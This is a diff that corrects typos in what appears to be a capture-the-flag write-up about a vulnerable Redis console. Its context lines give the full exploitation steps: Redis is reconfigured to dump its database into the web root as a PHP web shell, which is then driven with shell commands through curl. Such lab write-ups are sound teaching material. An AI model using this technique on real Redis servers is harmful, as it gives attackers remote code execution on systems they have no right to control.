@@ -12,7 +12,7 @@ We're pretty sure the bug is in the index page. Can you some
 ![Access](A-Redis-access.png)
 
 ## Solution
-The redis console in the kitchen has a vulnerability that allows to dump the contents of the databse to a file in the file system. To simplify the execution of payloads we can build a helper function as follows:
+The redis console in the kitchen has a vulnerability that allows to dump the contents of the database to a file in the file system. To simplify the execution of payloads we can build a helper function as follows:
 ```
 function cmd {
   curl "localhost/maintenance.php?cmd=$1"
@@ -33,7 +33,7 @@ Running: redis-cli --raw -a '<password censored>' 'save'
 OK
 ```
 
-The php file will contain some REDIS database headers but those do not stop PHP from executing the rest of the code
+The php file will contain some REDIS database headers but those do not stop PHP from executing the rest of the code.
 ```
 curl localhost/1.php --output -
 REDIS0009�      redis-ver5.0.3�
@@ -74,14 +74,14 @@ echo $result;
 ```
 
 ## Full RCE
-We can achive upload a simple RCE php with the following sequence.
+We can achieve upload a simple RCE php with the following sequence.
 1. Load our helper function to simplify the exploitation
 ```
 function cmd {
   curl "localhost/maintenance.php?cmd=$1"
   }
 ```
-2. Flush the database to avoid undesired content, configure redis to store out databse content into a php file and save the database.
+2. Flush the database to avoid undesired content, configure redis to store out database content into a php file and save the database.
 ```
 cmd flushall
 cmd config,set,dir,/var/www/html
@@ -93,7 +93,7 @@ cmd save
 ```
 curl localhost/rce.php?cmd=ls --output -
 ```
-Spaces have to be replaced with `+` or `%20` to succeed.
+* Spaces have to be replaced with `+` or `%20` to succeed.
 ```
 curl localhost/rce.php?cmd=ls%20-al --output -
 ```
